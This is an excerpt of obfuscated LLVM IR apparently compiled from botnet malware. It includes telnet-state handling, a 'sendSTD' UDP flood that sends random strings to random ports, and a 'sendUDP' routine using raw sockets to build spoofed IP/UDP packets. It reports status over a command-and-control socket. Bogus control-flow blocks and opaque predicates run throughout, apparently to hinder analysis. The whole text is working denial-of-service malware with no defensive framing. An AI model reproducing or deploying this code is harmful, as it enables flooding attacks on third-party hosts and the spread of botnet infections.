  %1644 = load i32, i32* %5, align 4
  %1645 = sext i32 %1644 to i64
  %1646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1645
  %1647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1646, i32 0, i32 0
  %1648 = load i32, i32* %1647, align 16
  %1649 = call i32 @sclose(i32 %1648)
  %1650 = load i32, i32* %5, align 4
  %1651 = sext i32 %1650 to i64
  %1652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1651
  %1653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1652, i32 0, i32 2
  store i8 0, i8* %1653, align 8
  %1654 = load i32, i32* %5, align 4
  %1655 = sext i32 %1654 to i64
  %1656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1655
  %1657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1656, i32 0, i32 3
  store i8 1, i8* %1657, align 1
  br label %originalBB179

originalBB183alteredBB:                           ; preds = %originalBB183, %1166
  %1658 = load i32, i32* %5, align 4
  %1659 = sext i32 %1658 to i64
  %1660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1659
  %1661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1660, i32 0, i32 0
  %1662 = load i32, i32* %1661, align 16
  %1663 = call i64 @send(i32 %1662, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.318, i32 0, i32 0), i64 7, i32 16384)
  %1664 = icmp slt i64 %1663, 0
  br label %originalBB183

originalBB187alteredBB:                           ; preds = %originalBB187, %1236
  %1665 = load i32, i32* %5, align 4
  %1666 = sext i32 %1665 to i64
  %1667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1666
  %1668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1667, i32 0, i32 0
  %1669 = load i32, i32* %1668, align 16
  %1670 = call i32 @sclose(i32 %1669)
  %1671 = load i32, i32* %5, align 4
  %1672 = sext i32 %1671 to i64
  %1673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1672
  %1674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1673, i32 0, i32 2
  store i8 0, i8* %1674, align 8
  %1675 = load i32, i32* %5, align 4
  %1676 = sext i32 %1675 to i64
  %1677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1676
  %1678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1677, i32 0, i32 3
  store i8 1, i8* %1678, align 1
  br label %originalBB187

originalBB191alteredBB:                           ; preds = %originalBB191, %1292
  %1679 = load i32, i32* %5, align 4
  %1680 = sext i32 %1679 to i64
  %1681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1680
  call void @reset_telstate(%struct.telstate_t* %1681)
  br label %originalBB191

originalBB195alteredBB:                           ; preds = %originalBB195, %1353
  %1682 = load i32, i32* %5, align 4
  %1683 = sext i32 %1682 to i64
  %1684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1683
  %1685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1684, i32 0, i32 7
  %1686 = load i32, i32* %1685, align 16
  %_196 = sub i32 %1686, 60
  %gen197 = mul i32 %_196, 60
  %_198 = sub i32 %1686, 60
  %gen199 = mul i32 %_198, 60
  %_200 = shl i32 %1686, 60
  %_201 = sub i32 0, %1686
  %gen202 = add i32 %_201, 60
  %_203 = sub i32 0, %1686
  %gen204 = add i32 %_203, 60
  %_205 = shl i32 %1686, 60
  %_206 = sub i32 %1686, 60
  %gen207 = mul i32 %_206, 60
  %_208 = sub i32 %1686, 60
  %gen209 = mul i32 %_208, 60
  %1687 = add i32 %1686, 60
  %1688 = zext i32 %1687 to i64
  %1689 = call i64 @time(i64* null) #2
  %1690 = icmp slt i64 %1688, %1689
  br label %originalBB195

originalBB213alteredBB:                           ; preds = %originalBB213, %1379
  %1691 = load i32, i32* %5, align 4
  %1692 = sext i32 %1691 to i64
  %1693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1692
  %1694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1693, i32 0, i32 3
  %1695 = load i8, i8* %1694, align 1
  %1696 = zext i8 %1695 to i32
  %1697 = icmp ne i32 %1696, 3
  br label %originalBB213

originalBB217alteredBB:                           ; preds = %originalBB217, %1432
  br label %originalBB217
}

; Function Attrs: nounwind
declare i64 @time(i64*) #4

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i64, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca [12 x i8], align 1
  %18 = alloca [78 x i8*], align 16
  %19 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %11, align 4
  %20 = call i64 @time(i64* null) #2
  store i64 %20, i64* %14, align 8
  %21 = call noalias i8* @malloc(i64 1024) #2
  store i8* %21, i8** %16, align 8
  %22 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 1024, i32 1, i1 false)
  %23 = getelementptr inbounds [12 x i8], [12 x i8]* %17, i32 0, i32 0
  %24 = load i32, i32* %5, align 4
  %25 = call i32 (i8*, i8*, ...) @sprintf(i8* %23, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.323, i32 0, i32 0), i32 %24) #2
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %17, i32 0, i32 0
  %27 = call i32 @strcmp(i8* %26, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.324, i32 0, i32 0)) #10
  %28 = icmp ne i32 %27, 0
  br i1 %28, label %30, label %29

; <label>:29:                                     ; preds = %3
  store i32 1, i32* %11, align 4
  br label %30

; <label>:30:                                     ; preds = %29, %3
  %31 = load i32, i32* @x.87
  %32 = load i32, i32* @y.88
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %30
  %39 = bitcast [78 x i8*]* %18 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %39, i8* bitcast ([78 x i8*]* @sendSTD.randstrings to i8*), i64 624, i32 16, i1 false)
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %40, align 4
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = load i8*, i8** %4, align 8
  %43 = getelementptr inbounds [12 x i8], [12 x i8]* %17, i32 0, i32 0
  %44 = call i32 (i32, i8*, ...) @sockprintf(i32 %41, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.402, i32 0, i32 0), i8* %42, i8* %43)
  %45 = load i32, i32* @x.87
  %46 = load i32, i32* @y.88
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %53

; <label>:53:                                     ; preds = %originalBBpart210, %originalBBpart2
  %54 = load i32, i32* %11, align 4
  %55 = icmp eq i32 %54, 1
  br i1 %55, label %56, label %63

; <label>:56:                                     ; preds = %53
  %57 = call i32 @rand() #2
  %58 = srem i32 %57, 65535
  %59 = add nsw i32 %58, 1026
  %60 = trunc i32 %59 to i16
  %61 = call zeroext i16 @htons(i16 zeroext %60) #13
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %61, i16* %62, align 2
  br label %68

; <label>:63:                                     ; preds = %53
  %64 = load i32, i32* %5, align 4
  %65 = trunc i32 %64 to i16
  %66 = call zeroext i16 @htons(i16 zeroext %65) #13
  %67 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %66, i16* %67, align 2
  br label %68

; <label>:68:                                     ; preds = %63, %56
  %69 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %69, i32* %7, align 4
  %70 = icmp slt i32 %69, 0
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %68
  br label %89

; <label>:72:                                     ; preds = %68
  %73 = call i32 @rand() #2
  %74 = sext i32 %73 to i64
  %75 = urem i64 %74, 78
  %76 = getelementptr inbounds [78 x i8*], [78 x i8*]* %18, i64 0, i64 %75
  %77 = load i8*, i8** %76, align 8
  store i8* %77, i8** %16, align 8
  %78 = load i32, i32* %7, align 4
  %79 = load i8*, i8** %16, align 8
  %80 = load i8*, i8** %16, align 8
  %81 = call i64 @strlen(i8* %80) #10
  %82 = bitcast %union.__CONST_SOCKADDR_ARG* %19 to %struct.sockaddr**
  %83 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  store %struct.sockaddr* %83, %struct.sockaddr** %82, align 8
  %84 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %19, i32 0, i32 0
  %85 = load %struct.sockaddr*, %struct.sockaddr** %84, align 8
  %86 = call i64 @sendto(i32 %78, i8* %79, i64 %81, i32 0, %struct.sockaddr* %85, i32 16)
  %87 = load i32, i32* %7, align 4
  %88 = call i32 @close(i32 %87)
  br label %89

; <label>:89:                                     ; preds = %72, %71
  %90 = load i32, i32* %8, align 4
  %91 = icmp sge i32 %90, 100
  br i1 %91, label %92, label %102

; <label>:92:                                     ; preds = %89
  %93 = call i64 @time(i64* null) #2
  %94 = load i64, i64* %14, align 8
  %95 = load i32, i32* %6, align 4
  %96 = sext i32 %95 to i64
  %97 = add nsw i64 %94, %96
  %98 = icmp sge i64 %93, %97
  br i1 %98, label %99, label %100

; <label>:99:                                     ; preds = %92
  br label %121

; <label>:100:                                    ; preds = %92
  store i32 0, i32* %8, align 4
  br label %101

; <label>:101:                                    ; preds = %100
  br label %102

; <label>:102:                                    ; preds = %101, %89
  %103 = load i32, i32* @x.87
  %104 = load i32, i32* @y.88
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %102
  %111 = load i32, i32* %8, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %8, align 4
  %113 = load i32, i32* @x.87
  %114 = load i32, i32* @y.88
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart210, label %originalBB1alteredBB

originalBBpart210:                                ; preds = %originalBB1
  br label %53

; <label>:121:                                    ; preds = %99
  %122 = load i32, i32* @x.87
  %123 = load i32, i32* @y.88
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %121
  %130 = load i32, i32* %7, align 4
  %131 = call i32 @close(i32 %130)
  call void @exit(i32 0) #14
  %132 = load i32, i32* @x.87
  %133 = load i32, i32* @y.88
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  unreachable
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %30
  %141 = bitcast [78 x i8*]* %18 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %141, i8* bitcast ([78 x i8*]* @sendSTD.randstrings to i8*), i64 624, i32 16, i1 false)
  %142 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %142, align 4
  %143 = load i32, i32* @mainCommSock, align 4
  %144 = load i8*, i8** %4, align 8
  %145 = getelementptr inbounds [12 x i8], [12 x i8]* %17, i32 0, i32 0
  %146 = call i32 (i32, i8*, ...) @sockprintf(i32 %143, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.402, i32 0, i32 0), i8* %144, i8* %145)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %102
  %147 = load i32, i32* %8, align 4
  %_ = shl i32 %147, 1
  %_2 = shl i32 %147, 1
  %_3 = shl i32 %147, 1
  %_4 = sub i32 %147, 1
  %gen = mul i32 %_4, 1
  %_5 = sub i32 %147, 1
  %gen6 = mul i32 %_5, 1
  %_7 = sub i32 0, %147
  %gen8 = add i32 %_7, 1
  %148 = add nsw i32 %147, 1
  store i32 %148, i32* %8, align 4
  br label %originalBB1

originalBB12alteredBB:                            ; preds = %originalBB12, %121
  %149 = load i32, i32* %7, align 4
  %150 = call i32 @close(i32 %149)
  call void @exit(i32 0) #14
  br label %originalBB12
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = load i32, i32* @x.89
  %10 = load i32, i32* @y.90
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.sockaddr_in, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca %struct.iphdr*, align 8
  %39 = alloca %struct.udphdr*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %17, align 8
  store i32 %1, i32* %18, align 4
  store i32 %2, i32* %19, align 4
  store i32 %3, i32* %20, align 4
  store i32 %4, i32* %21, align 4
  store i32 %5, i32* %22, align 4
  store i32 %6, i32* %23, align 4
  store i32 %7, i32* %24, align 4
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 0
  store i16 2, i16* %44, align 4
  %45 = load i32, i32* %18, align 4
  %46 = icmp eq i32 %45, 0
  %47 = load i32, i32* @x.89
  %48 = load i32, i32* @y.90
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %46, label %55, label %59

; <label>:55:                                     ; preds = %originalBBpart2
  %56 = call i32 @rand_cmwc()
  %57 = trunc i32 %56 to i16
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %57, i16* %58, align 2
  br label %64

; <label>:59:                                     ; preds = %originalBBpart2
  %60 = load i32, i32* %18, align 4
  %61 = trunc i32 %60 to i16
  %62 = call zeroext i16 @htons(i16 zeroext %61) #13
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %62, i16* %63, align 2
  br label %64

; <label>:64:                                     ; preds = %59, %55
  %65 = load i8*, i8** %17, align 8
  %66 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 2
  %67 = call i32 @getHost(i8* %65, %struct.in_addr* %66)
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %64
  br label %535

; <label>:70:                                     ; preds = %64
  %71 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 3
  %72 = getelementptr inbounds [8 x i8], [8 x i8]* %71, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %72, i8 0, i64 8, i32 4, i1 false)
  %73 = load i32, i32* %22, align 4
  store i32 %73, i32* %26, align 4
  %74 = load i32, i32* %20, align 4
  %75 = icmp eq i32 %74, 32
  br i1 %75, label %76, label %192

; <label>:76:                                     ; preds = %70
  %77 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %77, i32* %27, align 4
  %78 = load i32, i32* %27, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %83, label %80

; <label>:80:                                     ; preds = %76
  %81 = load i32, i32* @mainCommSock, align 4
  %82 = call i32 (i32, i8*, ...) @sockprintf(i32 %81, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i32 0, i32 0))
  br label %535

; <label>:83:                                     ; preds = %76
  %84 = load i32, i32* @x.89
  %85 = load i32, i32* @y.90
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %83
  %92 = load i32, i32* %21, align 4
  %93 = add nsw i32 %92, 1
  %94 = sext i32 %93 to i64
  %95 = call noalias i8* @malloc(i64 %94) #2
  store i8* %95, i8** %28, align 8
  %96 = load i8*, i8** %28, align 8
  %97 = icmp eq i8* %96, null
  %98 = load i32, i32* @x.89
  %99 = load i32, i32* @y.90
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart28, label %originalBB1alteredBB

originalBBpart28:                                 ; preds = %originalBB1
  br i1 %97, label %106, label %107

; <label>:106:                                    ; preds = %originalBBpart28
  br label %535

; <label>:107:                                    ; preds = %originalBBpart28
  %108 = load i8*, i8** %28, align 8
  %109 = load i32, i32* %21, align 4
  %110 = add nsw i32 %109, 1
  %111 = sext i32 %110 to i64
  call void @llvm.memset.p0i8.i64(i8* %108, i8 0, i64 %111, i32 1, i1 false)
  %112 = load i8*, i8** %28, align 8
  %113 = load i32, i32* %21, align 4
  call void @makeRandomStr(i8* %112, i32 %113)
  %114 = call i64 @time(i64* null) #2
  %115 = load i32, i32* %19, align 4
  %116 = sext i32 %115 to i64
  %117 = add nsw i64 %114, %116
  %118 = trunc i64 %117 to i32
  store i32 %118, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 0, i32* %31, align 4
  br label %119

; <label>:119:                                    ; preds = %172, %168, %161, %107
  %120 = load i32, i32* @x.89
  %121 = load i32, i32* @y.90
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %119
  %128 = load i32, i32* %27, align 4
  %129 = load i8*, i8** %28, align 8
  %130 = load i32, i32* %21, align 4
  %131 = sext i32 %130 to i64
  %132 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %133 = bitcast %struct.sockaddr_in* %25 to %struct.sockaddr*
  store %struct.sockaddr* %133, %struct.sockaddr** %132, align 8
  %134 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %135 = load %struct.sockaddr*, %struct.sockaddr** %134, align 8
  %136 = call i64 @sendto(i32 %128, i8* %129, i64 %131, i32 0, %struct.sockaddr* %135, i32 16)
  %137 = load i32, i32* %30, align 4
  %138 = load i32, i32* %26, align 4
  %139 = icmp eq i32 %137, %138
  %140 = load i32, i32* @x.89
  %141 = load i32, i32* @y.90
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %139, label %148, label %162

; <label>:148:                                    ; preds = %originalBBpart212
  %149 = load i32, i32* %18, align 4
  %150 = icmp eq i32 %149, 0
  br i1 %150, label %151, label %155

; <label>:151:                                    ; preds = %148
  %152 = call i32 @rand_cmwc()
  %153 = trunc i32 %152 to i16
  %154 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %153, i16* %154, align 2
  br label %155

; <label>:155:                                    ; preds = %151, %148
  %156 = call i64 @time(i64* null) #2
  %157 = load i32, i32* %29, align 4
  %158 = sext i32 %157 to i64
  %159 = icmp sgt i64 %156, %158
  br i1 %159, label %160, label %161

; <label>:160:                                    ; preds = %155
  br label %175

; <label>:161:                                    ; preds = %155
  store i32 0, i32* %30, align 4
  br label %119

; <label>:162:                                    ; preds = %originalBBpart212
  %163 = load i32, i32* %30, align 4
  %164 = add i32 %163, 1
  store i32 %164, i32* %30, align 4
  %165 = load i32, i32* %31, align 4
  %166 = load i32, i32* %23, align 4
  %167 = icmp eq i32 %165, %166
  br i1 %167, label %168, label %172

; <label>:168:                                    ; preds = %162
  %169 = load i32, i32* %24, align 4
  %170 = mul nsw i32 %169, 1000
  %171 = call i32 @usleep(i32 %170)
  store i32 0, i32* %31, align 4
  br label %119

; <label>:172:                                    ; preds = %162
  %173 = load i32, i32* %31, align 4
  %174 = add i32 %173, 1
  store i32 %174, i32* %31, align 4
  br label %119

; <label>:175:                                    ; preds = %160
  %176 = load i32, i32* @x.89
  %177 = load i32, i32* @y.90
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %175
  %184 = load i32, i32* @x.89
  %185 = load i32, i32* @y.90
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %535

; <label>:192:                                    ; preds = %70
  %193 = load i32, i32* @x.89
  %194 = load i32, i32* @y.90
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %192
  %201 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %201, i32* %33, align 4
  %202 = load i32, i32* %33, align 4
  %203 = icmp ne i32 %202, 0
  %204 = load i32, i32* @x.89
  %205 = load i32, i32* @y.90
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %203, label %215, label %212

; <label>:212:                                    ; preds = %originalBBpart220
  %213 = load i32, i32* @mainCommSock, align 4
  %214 = call i32 (i32, i8*, ...) @sockprintf(i32 %213, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i32 0, i32 0))
  br label %535

; <label>:215:                                    ; preds = %originalBBpart220
  %216 = load i32, i32* @x.89
  %217 = load i32, i32* @y.90
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %215
  store i32 1, i32* %34, align 4
  %224 = load i32, i32* %33, align 4
  %225 = bitcast i32* %34 to i8*
  %226 = call i32 @setsockopt(i32 %224, i32 0, i32 3, i8* %225, i32 4) #2
  %227 = icmp slt i32 %226, 0
  %228 = load i32, i32* @x.89
  %229 = load i32, i32* @y.90
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %227, label %236, label %239

; <label>:236:                                    ; preds = %originalBBpart224
  %237 = load i32, i32* @mainCommSock, align 4
  %238 = call i32 (i32, i8*, ...) @sockprintf(i32 %237, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.404, i32 0, i32 0))
  br label %535

; <label>:239:                                    ; preds = %originalBBpart224
  %240 = load i32, i32* @x.89
  %241 = load i32, i32* @y.90
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %239
  store i32 50, i32* %35, align 4
  %248 = load i32, i32* @x.89
  %249 = load i32, i32* @y.90
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %256

; <label>:256:                                    ; preds = %276, %originalBBpart228
  %257 = load i32, i32* @x.89
  %258 = load i32, i32* @y.90
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %256
  %265 = load i32, i32* %35, align 4
  %266 = add nsw i32 %265, -1
  store i32 %266, i32* %35, align 4
  %267 = icmp ne i32 %265, 0
  %268 = load i32, i32* @x.89
  %269 = load i32, i32* @y.90
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBBpart236, label %originalBB30alteredBB

originalBBpart236:                                ; preds = %originalBB30
  br i1 %267, label %276, label %283

; <label>:276:                                    ; preds = %originalBBpart236
  %277 = call i64 @time(i64* null) #2
  %278 = call i32 @rand_cmwc()
  %279 = zext i32 %278 to i64
  %280 = xor i64 %277, %279
  %281 = trunc i64 %280 to i32
  call void @srand(i32 %281) #2
  %282 = call i32 @rand() #2
  call void @init_rand(i32 %282)
  br label %256

; <label>:283:                                    ; preds = %originalBBpart236
  %284 = load i32, i32* %20, align 4
  %285 = icmp eq i32 %284, 0
  br i1 %285, label %286, label %287

; <label>:286:                                    ; preds = %283
  store i32 0, i32* %36, align 4
  br label %293

; <label>:287:                                    ; preds = %283
  %288 = load i32, i32* %20, align 4
  %289 = sub nsw i32 32, %288
  %290 = shl i32 1, %289
  %291 = sub nsw i32 %290, 1
  %292 = xor i32 %291, -1
  store i32 %292, i32* %36, align 4
  br label %293

; <label>:293:                                    ; preds = %287, %286
  %294 = load i32, i32* %21, align 4
  %295 = sext i32 %294 to i64
  %296 = add i64 28, %295
  %297 = call i8* @llvm.stacksave()
  store i8* %297, i8** %37, align 8
  %298 = alloca i8, i64 %296, align 16
  %299 = bitcast i8* %298 to %struct.iphdr*
